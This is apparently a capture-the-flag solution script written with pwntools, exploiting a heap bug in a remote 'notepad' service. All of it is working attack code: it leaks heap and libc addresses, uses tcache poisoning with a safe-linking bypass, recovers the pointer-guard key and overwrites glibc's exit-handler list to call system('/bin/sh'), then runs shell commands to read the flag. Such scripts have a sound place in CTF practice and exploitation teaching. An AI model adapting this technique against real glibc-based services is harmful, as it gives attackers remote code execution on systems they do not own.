#!/usr/bin/env python2
from pwn import *
# context.log_level = "debug"
context.terminal = ["tmux", "split", "-h"]
def alloc (idx, content, length=None): 
    p.sendlineafter("> ", "1")
    p.sendlineafter(": ", str(idx))
    if length != None:
        p.sendlineafter(": ", str(length))
    else:
        p.sendlineafter(": ", str(len(content)))
    p.sendlineafter(": ", content)
    
def delete (idx): 
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))

def printer():
    p.sendlineafter("> ", "3")

# p = process("./notepad")
p = remote("cat.moe", 8003)

alloc(1, "QWEQWEQ")
delete(1)
alloc(2, "", 0)
printer()
p.recvuntil("-> ")
leak =u64(p.recvline()[:-1] + "\x00"*3)
heap_base = leak << 12
print "heap", hex(heap_base)

for i in range(3, 12):
    alloc(i, "ASDASDAS", 20)

for i in range(3, 10):
    delete(i)

delete(10)

alloc(10, "", 0)
printer()
p.recvuntil("10 -> ")
libc_base = u64(p.recvline()[:-1] + "\x00\x00") - 0x219ce0
print "libc", hex(libc_base)

target = libc_base - 0x28a0+0x10
alloc(9, p64((heap_base >> 12) ^ target))
alloc(12, "X")
alloc(13,"", 0)
printer()
p.recvuntil("13 -> ")
key = u64(p.recvline()[:-1])
print(hex(key))
delete(9)

# gdb.attach(p)
initial = libc_base + 0x21af00
system = libc_base + 0x0000000000050d60
binsh = libc_base + 0x1d8698
alloc(9, p64((heap_base >> 12) ^ initial))
alloc(14, "Z")
alloc(15, ''.join([
    p64(0),
    p64(1),
    p64(4),
    p64(rol(system ^ key, 17, 64)),
    p64(binsh)
]))

p.sendline("5")
p.sendline("id")
p.sendline("cat /home/notepad/flag")
p.interactive()
